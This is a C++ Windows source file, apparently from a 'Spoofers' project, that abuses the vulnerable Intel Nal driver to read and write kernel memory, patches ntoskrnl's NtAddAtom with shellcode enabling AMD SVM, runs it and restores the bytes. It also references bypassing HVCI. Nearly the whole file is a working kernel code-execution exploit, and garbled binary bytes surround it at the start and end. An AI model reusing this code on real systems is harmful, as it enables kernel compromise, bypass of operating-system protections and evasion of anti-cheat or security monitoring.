◊}// SimpleSvmLoader.cpp - FIXED with proper physical memory write
// Uses physical memory mapping like HVCIBypass (which works)
// Enables EFER.SVME via shellcode execution

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007
#define INTEL_CASE_VIRT_TO_PHYS 0x25
#define INTEL_CASE_MAP_PHYSICAL 0x19
#define INTEL_CASE_COPY 0x33

typedef struct _INTEL_COPY_MEMORY {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} INTEL_COPY_MEMORY;

typedef struct _INTEL_VIRT_TO_PHYS {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} INTEL_VIRT_TO_PHYS;

typedef struct _INTEL_MAP_PHYS {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} INTEL_MAP_PHYS;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
NTSTATUS NTAPI NtAddAtom(PVOID, ULONG, PUSHORT);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;

// ==================== Intel Driver Functions (SAFE VERSION)
// ====================

bool SafeReadKernel(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);

  INTEL_COPY_MEMORY info = {0};
  info.case_number = 0x33;
  info.source = address;
  info.destination = (uint64_t)pinnedBuffer;
  info.length = size;

  DWORD bytesReturned = 0;
  BOOL result = DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                                nullptr, 0, &bytesReturned, nullptr);
  if (result)
    memcpy(buffer, pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  Sleep(1);
  return result != FALSE;
}

// SAFE WRITE using physical memory mapping (SAME AS HVIBYPASS!)
bool SafeWriteKernel(uint64_t address, void *buffer, uint64_t size) {
  // Step 1: Translate virtual to physical
  INTEL_VIRT_TO_PHYS vtop = {0};
  vtop.case_number = INTEL_CASE_VIRT_TO_PHYS;
  vtop.address_to_translate = address;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &vtop, sizeof(vtop), &vtop,
                       sizeof(vtop), &bytesReturned, nullptr)) {
    printf("    [!] vtop failed, trying direct write...\n");
    goto direct_write;
  }

  uint64_t physAddr = vtop.return_physical_address;
  if (physAddr == 0) {
    printf("    [!] Got NULL physical address, trying direct write...\n");
    goto direct_write;
  }
  printf("    [*] Physical: 0x%llX\n", physAddr);

  // Step 2: Map physical memory
  {
    INTEL_MAP_PHYS mapInfo = {0};
    mapInfo.case_number = INTEL_CASE_MAP_PHYSICAL;
    mapInfo.physical_address_to_map = physAddr & ~0xFFFULL;
    mapInfo.size = 0x1000;

    if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &mapInfo, sizeof(mapInfo),
                         &mapInfo, sizeof(mapInfo), &bytesReturned, nullptr)) {
      printf("    [!] Map failed, trying direct write...\n");
      goto direct_write;
    }

    if (mapInfo.return_virtual_address == 0) {
      printf("    [!] Mapped to NULL, trying direct write...\n");
      goto direct_write;
    }

    printf("    [*] Mapped to kernel VA: 0x%llX\n",
           mapInfo.return_virtual_address);

    // Step 3: Write via mapped address
    uint64_t pageOffset = address & 0xFFF;
    uint64_t targetAddr = mapInfo.return_virtual_address + pageOffset;

    void *pinnedBuffer =
        VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pinnedBuffer)
      return false;
    memcpy(pinnedBuffer, buffer, size);
    VirtualLock(pinnedBuffer, 0x1000);

    INTEL_COPY_MEMORY copyInfo = {0};
    copyInfo.case_number = INTEL_CASE_COPY;
    copyInfo.source = (uint64_t)pinnedBuffer;
    copyInfo.destination = targetAddr;
    copyInfo.length = size;

    BOOL result =
        DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &copyInfo, sizeof(copyInfo),
                        nullptr, 0, &bytesReturned, nullptr);
    VirtualUnlock(pinnedBuffer, 0x1000);
    VirtualFree(pinnedBuffer, 0, MEM_RELEASE);

    if (result) {
      printf("    [+] Written %llu bytes via physical mapping!\n", size);
      return true;
    }
  }

direct_write:
  // Fallback: direct copy
  printf("    [*] Using direct write fallback...\n");
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);

  INTEL_COPY_MEMORY copyInfo = {0};
  copyInfo.case_number = INTEL_CASE_COPY;
  copyInfo.source = (uint64_t)pinnedBuffer;
  copyInfo.destination = address;
  copyInfo.length = size;

  BOOL result =
      DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &copyInfo, sizeof(copyInfo),
                      nullptr, 0, &bytesReturned, nullptr);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result != FALSE;
}

// Verify memory is readable before operations
bool VerifyKernelMemory(uint64_t address, uint64_t size) {
  uint8_t *testBuffer = (uint8_t *)malloc(size);
  if (!testBuffer)
    return false;

  bool result = SafeReadKernel(address, testBuffer, size);
  if (result) {
    printf("    [+] Memory verified readable at 0x%llX\n", address);
  }
  free(testBuffer);
  return result;
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;

  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }

  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;

  if (!SafeReadKernel(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;

  if (!SafeReadKernel(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                      sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;

  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;

  uint32_t readSize = (exportSize < 0x40000u) ? exportSize : 0x40000u;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;

  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000u) ? (readSize - offset) : 0x1000u;
    SafeReadKernel(moduleBase + exportRva + offset, exportData + offset,
                   chunkSize);
  }

  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;

  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }

  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);

  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;

    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }

  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

// ==================== Shellcode ====================

uint8_t svmEnableShellcode[] = {
    0x55,             // push rbp
    0x48, 0x89, 0xE5, // mov rbp, rsp
    0x53,             // push rbx
    0x51,             // push rcx
    0x52,             // push rdx

    // Check VM_CR.SVMDIS
    0xB9, 0x14, 0x01, 0x01, 0xC0, // mov ecx, 0xC0010114 (VM_CR)
    0x0F, 0x32,                   // rdmsr
    0xA9, 0x10, 0x00, 0x00, 0x00, // test eax, 0x10 (SVMDIS bit 4)
    0x75, 0x27,                   // jnz error_exit

    // Read current EFER
    0xB9, 0x80, 0x00, 0x00, 0xC0, // mov ecx, 0xC0000080 (EFER)
    0x0F, 0x32,                   // rdmsr

    // Check if SVME already set
    0xA9, 0x00, 0x10, 0x00, 0x00, // test eax, 0x1000 (SVME bit 12)
    0x75, 0x0E,                   // jnz success

    // Enable SVME
    0x0D, 0x00, 0x10, 0x00, 0x00, // or eax, 0x1000
    0xB9, 0x80, 0x00, 0x00, 0xC0, // mov ecx, 0xC0000080 (EFER)
    0x0F, 0x30,                   // wrmsr

    // success:
    0x48, 0x31, 0xC0, // xor rax, rax
    0xEB, 0x05,       // jmp cleanup

    // error_exit:
    0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, // mov rax, 1

    // cleanup:
    0x5A, // pop rdx
    0x59, // pop rcx
    0x5B, // pop rbx
    0x5D, // pop rbp
    0xC3  // ret
};

uint8_t originalNtAddAtom[64];
bool hookedOnce = false;

bool ExecuteShellcode(uint8_t *shellcode, size_t size, uint64_t *result) {
  if (!kernelNtAddAtom)
    return false;

  // VERIFY memory first!
  printf("[*] Verifying NtAddAtom is readable...\n");
  if (!VerifyKernelMemory(kernelNtAddAtom, sizeof(originalNtAddAtom))) {
    printf("[-] NtAddAtom memory not accessible!\n");
    return false;
  }

  if (!hookedOnce) {
    printf("[*] Backing up NtAddAtom bytes...\n");
    if (!SafeReadKernel(kernelNtAddAtom, originalNtAddAtom,
                        sizeof(originalNtAddAtom))) {
      printf("[-] Failed to backup NtAddAtom!\n");
      return false;
    }
    printf("[+] Backup successful: %02X %02X %02X %02X...\n",
           originalNtAddAtom[0], originalNtAddAtom[1], originalNtAddAtom[2],
           originalNtAddAtom[3]);
    hookedOnce = true;
  }

  // Write shellcode using SAFE physical mapping
  printf("[*] Writing shellcode (%zu bytes)...\n", size);
  if (!SafeWriteKernel(kernelNtAddAtom, shellcode, size)) {
    printf("[-] Failed to write shellcode!\n");
    return false;
  }

  // Verify write
  uint8_t verifyBuf[16];
  SafeReadKernel(kernelNtAddAtom, verifyBuf, 16);
  printf(
      "[*] Verify write: %02X %02X %02X %02X (expected: %02X %02X %02X %02X)\n",
      verifyBuf[0], verifyBuf[1], verifyBuf[2], verifyBuf[3], shellcode[0],
      shellcode[1], shellcode[2], shellcode[3]);

  if (memcmp(verifyBuf, shellcode, 4) != 0) {
    printf("[-] Write verification failed!\n");
    return false;
  }

  // Call NtAddAtom
  printf("[*] Calling NtAddAtom (executing shellcode)...\n");
  USHORT atom = 0;
  NTSTATUS status = NtAddAtom(nullptr, 0, &atom);
  printf("[*] NtAddAtom returned: 0x%X\n", status);

  // Restore immediately
  printf("[*] Restoring original bytes...\n");
  SafeWriteKernel(kernelNtAddAtom, originalNtAddAtom,
                  sizeof(originalNtAddAtom));

  if (result)
    *result = (uint64_t)(uint32_t)status;
  return true;
}

// ==================== CPU Checks ====================

bool CheckAmdCpu() {
  int regs[4];
  __cpuid(regs, 0);
  return (regs[1] == 'htuA' && regs[3] == 'itne' && regs[2] == 'DMAc');
}

bool CheckSvmSupport() {
  int regs[4];
  __cpuid(regs, 0x80000001);
  return (regs[2] & (1 << 2)) != 0;
}

bool CheckHypervisorPresent() {
  int regs[4];
  __cpuid(regs, 1);
  return (regs[2] & (1 << 31)) != 0;
}

// ==================== Main ====================

int main() {
  printf("================================================================\n");
  printf("       SIMPLE SVM LOADER (SAFE PHYSICAL WRITE)                 \n");
  printf("    Enables EFER.SVME with memory verification                 \n");
  printf(
      "================================================================\n\n");

  printf("=== CPU Check ===\n");
  if (!CheckAmdCpu()) {
    printf("[-] Not AMD CPU!\n");
    return 1;
  }
  printf("[+] AMD CPU detected\n");

  if (!CheckSvmSupport()) {
    printf("[-] SVM not supported!\n");
    return 1;
  }
  printf("[+] SVM supported\n");
  printf("[*] Hypervisor present (before): %s\n",
         CheckHypervisorPresent() ? "YES" : "NO");

  printf("\n=== Intel Driver ===\n");
  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not running! Use: sc start iqvw64e\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  if (!ntoskrnlBase) {
    printf("[-] ntoskrnl.exe not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] ntoskrnl.exe: 0x%llX\n", ntoskrnlBase);

  printf("[*] Finding NtAddAtom...\n");
  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  if (!kernelNtAddAtom) {
    printf("[-] NtAddAtom not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] NtAddAtom: 0x%llX\n", kernelNtAddAtom);

  printf(
      "\n================================================================\n");
  printf("Press ENTER to execute kernel shellcode or Ctrl+C to abort...\n");
  printf("================================================================\n");
  getchar();

  printf("\n=== Executing SVM Enable Shellcode ===\n");
  uint64_t result = 0;
  if (ExecuteShellcode(svmEnableShellcode, sizeof(svmEnableShellcode),
                       &result)) {
    if (result == 0) {
      printf("\n[+] SUCCESS! EFER.SVME is now enabled!\n");
    } else {
      printf("\n[!] Shellcode returned %llu (1 = SVM disabled by BIOS)\n",
             result);
    }
  } else {
    printf("\n[-] Failed to execute shellcode!\n");
  }

  printf("\n=== Post-Execution Check ===\n");
  printf("[*] Hypervisor present (after): %s\n",
         CheckHypervisorPresent() ? "YES" : "NO");

  printf(
      "\n================================================================\n");
  CloseHandle(hDevice);
  return 0;
}
    ! !'') )**+ +..0 0334 4556 6::; ;<<> >??E EPPS SYYb bccg goor ruuy y}}~ ~É
ÉÑ ÑÖ
Öä äã
ã£ £≠
≠∂ ∂…
…ñ ñÿ
ÿ› ›·
·Ï Ï»
»… …÷
÷€ €õ
õú úæ"
æ"∆" ∆"”"
”"€" €"≥#
≥#∫# ∫#ﬂ$
ﬂ$Á$ Á$Ñ&
Ñ&å& å&Ÿ&
Ÿ&ﬁ& ﬁ&(
(Û( Û(¬*
¬*Ò/ Ò/¸2
¸2∂? 
∂?˛? 
˛?ª@ ª@º@
º@Ω@ Ω@ø@
ø@¯@ 
¯@¬B 
¬BÁB ÁBB
B¸B ¸B˛B
˛BˇB ˇBÉC
ÉCÖC 
ÖC†C 
†C¶C 
¶C™C 
™C¥D 
¥DÊE 
ÊE§H §H±H
±HπH 
πH≥I 
≥I◊I ◊IŸI
ŸI J 
 JÕJ 
ÕJ÷M ÷M÷M
÷M”S ”S”S
”SâW âWˆX
ˆXàY àYºY
ºYÜ[ Ü[∂\
∂\Â\ Â\º]
º]≈] ≈]…]
…]À^ À^ˆ^
ˆ^˜^ ˜^Ç_
Ç_É_ É_â_
â_ì_ ì_î_
î_ï_ ï_µ_
µ_∂_ ∂_ﬂ_
ﬂ_·_ ·_‚_
‚_‰_ ‰_ê`
ê`ë` ë`ò`
ò`ô` ô`¡`
¡`¬` ¬`–`
–`—` —`‹`
‹`›` ›`ìa
ìaîa îaõa
õa•a •a¨a
¨a≠a ≠aπa
πaªa ªaÂa
ÂaÊa ÊaÈa
ÈaÍa ÍaÏa
ÏaÓa ÓaÛa
ÛaÙa ÙaÖb
ÖbÜb Üb–b
–bôc ôcŒc
ŒcÏc Ïc†d
†d±j ±j¥j
¥jµj µjπj
πj∫j ∫jΩj
Ωjæj æj√j
√jƒj ƒjÀj
ÀjÄk ÄkÑk
ÑkÖk Ökák
ákàk àkèk
èkêk êkëk
ëkík íkìk
ìkîk îkñk
ñk s  s’s
’s÷s ÷s›s
›sÁs ÁsÎs
ÎsÏs ÏsÔs
Ôs≈v ≈vœv
œvÕy Õyœy
œyòz òzöz
özœz œz÷z
÷zÿz ÿz›z
›zﬁz ﬁz‰z
‰zÂz ÂzËz
Ëzå{ å{é{
é{◊} 2.file:///c:/inject/Spoofers/SimpleSvmLoader.cpp